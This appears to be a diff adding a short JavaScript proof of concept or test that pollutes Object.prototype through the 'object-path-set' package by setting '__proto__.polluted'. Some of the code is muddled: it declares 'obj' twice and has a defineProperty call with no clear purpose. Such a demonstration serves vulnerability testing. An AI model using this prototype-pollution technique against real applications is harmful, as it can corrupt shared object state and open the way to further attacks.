@@ -1,0 +1,13 @@
+var obj = {};
+obj.__proto__.polluted = undefined;
+Object.defineProperty(obj, '__proto__', {
+    value: obj.__proto__,
+    writable: true,
+    enumerable: true,
+    configurable: true
+});
+const setPath = require('object-path-set');
+var obj = {};
+console.log({}.polluted);
+setPath(obj, '__proto__.polluted', 'yes');
+console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');
